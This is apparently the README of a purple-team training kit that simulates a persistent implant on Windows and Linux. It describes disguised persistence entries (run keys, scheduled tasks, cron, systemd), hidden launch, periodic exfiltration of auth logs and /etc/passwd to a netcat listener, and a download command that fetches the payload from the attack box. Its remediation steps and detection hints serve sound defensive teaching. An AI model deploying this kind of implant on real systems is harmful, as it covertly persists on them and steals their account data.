# 🐼 Operation Panda — Purple Team Training Exercise

A self-deploying persistence and log exfiltration simulation for authorized purple team exercises. Deploys benign panda ASCII art to demonstrate persistence, process hiding, and data exfiltration techniques. Designed to be detected and remediated by blue team students.

---

## ⚠️ Legal Warning

> **This toolkit is for authorized use only.**
>
> Deploying these scripts on any system without explicit written authorization from the system owner is illegal under the Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and equivalent legislation in most jurisdictions. Unauthorized use may result in criminal prosecution.
>
> By using this toolkit you confirm that:
> - You have explicit written authorization to test the target systems
> - The exercise is conducted in a controlled environment with defined scope
> - All participants (red team and blue team) are operating under an agreed rules of engagement document
> - You take full responsibility for any consequences of misuse

---

## Overview

Operation Panda simulates a persistent threat actor on both Windows and Linux targets. It demonstrates the following techniques in a safe, visible, and fully reversible way:

- **Persistence** via registry run keys, scheduled tasks (Windows) and cron, systemd user services, and desktop autostart entries (Linux)
- **Process hiding** via VBS silent launch and hidden deployment directories
- **Log exfiltration** of security-relevant events (password changes, user creation/deletion, permission changes) via HTTP POST to a netcat listener
- **Proof of life** via panda ASCII art windows that appear on screen periodically and remain open until manually closed

The payload is intentionally overt enough to be findable — the goal is to teach blue teamers to look in the right places, not to create an undetectable implant.

---

## File Structure

```
.
├── README.md                   # This file
├── panda_deploy.bat            # Windows self-deploying payload (single file)
├── remediatePanda.bat          # Windows remediation and verification script
├── panda_kali.sh               # Linux/Kali self-deploying payload (single file)
├── panda_kali_remediate.sh     # Linux remediation and verification script
└── panda_listener.sh           # Dual-port listener - run on attack box
```

---

## Setup — Before You Deploy

### 1. Start the listener on your attack box

```bash
chmod +x panda_listener.sh
./panda_listener.sh
```

The listener runs two ports simultaneously:
- **Port 4444** — Windows payloads (`panda_deploy.bat`)
- **Port 4445** — Linux payloads (`panda_kali.sh`)

Dumps are saved to `./panda_logs/windows/` and `./panda_logs/linux/` respectively, prefixed by hostname. Both listeners run in the background and merge output to one terminal — `[WINDOWS]` entries appear in yellow, `[LINUX]` in blue.

### 2. Set your listener IP in the payloads

**Windows** — open `panda_deploy.bat` in a text editor, find the PS1 section (after line 75) and update:
```powershell
$ExfilHost = "YOUR_KALI_IP_HERE"
```

**Linux** — open `panda_kali.sh` and update:
```bash
EXFIL_HOST="YOUR_KALI_IP_HERE"
```

Both default to `192.168.1.100`. Ports default to `4444` (Windows) and `4445` (Linux) and only need changing if you have a conflict.

### 3. Host the files (optional)

To transfer files to target machines over the network, serve them from your attack box:

```bash
python3 -m http.server 8080
```

Then on the target, download via browser at `http://<kali-ip>:8080` or:
```powershell
# Windows PowerShell
Invoke-WebRequest -Uri "http://<kali-ip>:8080/panda_deploy.bat" -OutFile "panda_deploy.bat"
```

---

## Deployment

### Windows Target

Run as **Administrator** for full log visibility (Security event log requires elevation). Standard user will still deploy and exfil, but Security log sections will show access denied — `Get-LocalUser` and `net user` snapshots always work regardless of privilege level.

```
panda_deploy.bat
```

What it does:
1. Creates `C:\ProgramData\WindowsUpdateManager\DiagCache\` (hidden, system attributes)
2. Writes `diagtrack_host.vbs` (silent launcher) and `diagtrack_runner.ps1` (payload)
3. Installs registry run key: `HKCU\...\Run\DiagnosticsHost`
4. Installs scheduled task: `MicrosoftDiagnosticsHost` (on logon, highest privilege)
5. Launches immediately via VBS — a panda window appears as proof of life and stays open until closed
6. Self-deletes the bat file
7. Every 2–3 hours: spawns another panda window (up to 25 concurrent) and exfiltrates logs

### Linux / Kali Target

```bash
chmod +x panda_kali.sh
./panda_kali.sh
```

What it does:
1. Copies itself to `~/.config/.diagtrack/diagtrack_runner.sh`
2. Installs cron `@reboot` entry
3. Installs systemd user service: `diagtrack-host`
4. Installs desktop autostart entry: `~/.config/autostart/gnome-diagnostics-helper.desktop`
5. Launches immediately — a panda terminal appears as proof of life and stays open until closed
6. Self-deletes the original script
7. Every 2–3 hours: spawns another panda terminal and exfiltrates logs

> **Note on reboot behavior:** The cron and systemd service restart the exfil loop on reboot. The desktop autostart entry additionally spawns panda terminals once the graphical session is fully loaded. If the system is headless, pandas will not appear but exfiltration will continue.

---

## Log Exfiltration

Each cycle collects and POSTs the following to the listener:

| Section | Source | Requires Admin |
|---|---|---|
| Password Changes | Security log (ID 4723, 4724) | Yes (Windows) |
| User Creation | Security log (ID 4720, 4722) | Yes (Windows) |
| User Deletion | Security log (ID 4726, 4725) | Yes (Windows) |
| Permission Changes | Security log (ID 4738, 4672, 4648, etc.) | Yes (Windows) |
| Local User Snapshot | `Get-LocalUser` / `net user` | No (Windows) |
| Local Group Snapshot | `Get-LocalGroup` | No (Windows) |
| Password Changes | `/var/log/auth.log` + `journalctl` | No (Linux) |
| User Changes | `/var/log/auth.log` + `journalctl` | No (Linux) |
| /etc/passwd Snapshot | `cat /etc/passwd` | No (Linux) |
| /etc/group Snapshot | `cat /etc/group` | No (Linux) |

On first startup, a 24-hour baseline is collected. Subsequent cycles collect the last 3 hours to match the exfil interval.

> **Note:** On Windows, `PasswordLastSet` in the local user snapshot always reflects password changes regardless of admin status — compare this field across consecutive dumps to detect changes even without Security log access.

---

## Remediation

### Windows

```
remediatePanda.bat
```

Run as Administrator — the script checks for elevation and exits immediately if not elevated. Steps performed:
1. Kills `wscript.exe` and **all** `powershell.exe` processes (the hidden payload loop disguises itself with a `.NET-BroadcastEventWindow` title — killing by title is insufficient)
2. Removes registry run key: `HKCU\...\Run\DiagnosticsHost`
3. Removes scheduled task: `MicrosoftDiagnosticsHost`
4. Strips hidden/system/readonly attributes recursively and deletes `C:\ProgramData\WindowsUpdateManager\`
5. Verifies each step and reports `[ OK ]` or `[FAIL]`

> **Note:** Any panda windows already open when remediate runs are independent child processes and will remain open. They cannot spawn new pandas once the payload loop is killed. Close them manually or wait — they stay open until the user closes them.

### Linux / Kali

```bash
chmod +x panda_kali_remediate.sh
./panda_kali_remediate.sh
```

Steps performed:
1. Kills `diagtrack_runner.sh` process and any orphaned `/tmp/.panda_*` scripts
2. Removes and disables systemd user service: `diagtrack-host`
3. Removes cron `@reboot` entry
4. Removes desktop autostart entry: `~/.config/autostart/gnome-diagnostics-helper.desktop`
5. Removes `~/.config/.diagtrack/` and all contents
6. Runs a final sweep of the home directory for stray copies, rechecks all persistence mechanisms

---

## Blue Team Detection Points

Students should be able to find the payload using the following techniques. This section is intended for the instructor — do not share with students before the exercise.

<details>
<summary>Expand detection hints (instructor only)</summary>

### Windows

| Technique | Command |
|---|---|
| Registry persistence | `regedit` → `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| Scheduled task | `schtasks /query /tn MicrosoftDiagnosticsHost` or `taskschd.msc` |
| Hidden directory | `dir /a C:\ProgramData\WindowsUpdateManager` |
| Running processes | Task Manager → Details → look for `wscript.exe`, `powershell.exe` with `.NET-BroadcastEventWindow` title |
| Process command line | `Get-WmiObject Win32_Process \| Select ProcessId, CommandLine` |
| Outbound connections | `netstat -nop TCP` — look for ESTABLISHED on port 4444 |
| Event log | Event Viewer → Security → filter IDs 4720, 4723, 4724, 4726, 4738 |
| Autoruns | Sysinternals Autoruns → Logon tab → look for `DiagnosticsHost` |

### Linux

| Technique | Command |
|---|---|
| Cron persistence | `crontab -l` |
| Systemd service | `systemctl --user list-unit-files` |
| Autostart entry | `ls -la ~/.config/autostart/` |
| Hidden directory | `ls -la ~/.config/` |
| Running process | `ps aux \| grep diagtrack` |
| Outbound connections | `ss -tnp` — look for ESTABLISHED on port 4445 |
| Auth log | `grep -i "passwd\|useradd\|usermod" /var/log/auth.log` |
| Panda log | `cat ~/.config/.diagtrack/.panda.log` |

</details>

---

## Configuration Reference

| Variable | File | Default | Description |
|---|---|---|---|
| `$ExfilHost` | `panda_deploy.bat` (PS1 section, line ~271) | `192.168.1.100` | Listener IP (Windows) |
| `$ExfilPort` | `panda_deploy.bat` (PS1 section) | `4444` | Listener port (Windows) |
| `EXFIL_HOST` | `panda_kali.sh` | `192.168.1.100` | Listener IP (Linux) |
| `EXFIL_PORT` | `panda_kali.sh` | `4445` | Listener port (Linux) |
| `WIN_PORT` | `panda_listener.sh` | `4444` | Windows listener port |
| `LIN_PORT` | `panda_listener.sh` | `4445` | Linux listener port |
| Sleep interval | Both payloads | 7200–10800s (2–3 hrs) | Time between exfil cycles |
| Panda cap | `panda_deploy.bat` | 25 | Max concurrent panda windows (Windows only) |

---

## Requirements

| Component | Requirement |
|---|---|
| Windows payload | Windows 10/11, PowerShell 5.1+, run as Administrator recommended |
| Linux payload | Bash, `nc` (netcat-openbsd), systemd user session, cron, graphical desktop for panda terminals |
| Listener | Kali Linux or any Linux with `nc` and `python3` |
| Network | Windows target must reach listener on port 4444, Linux target on port 4445 |
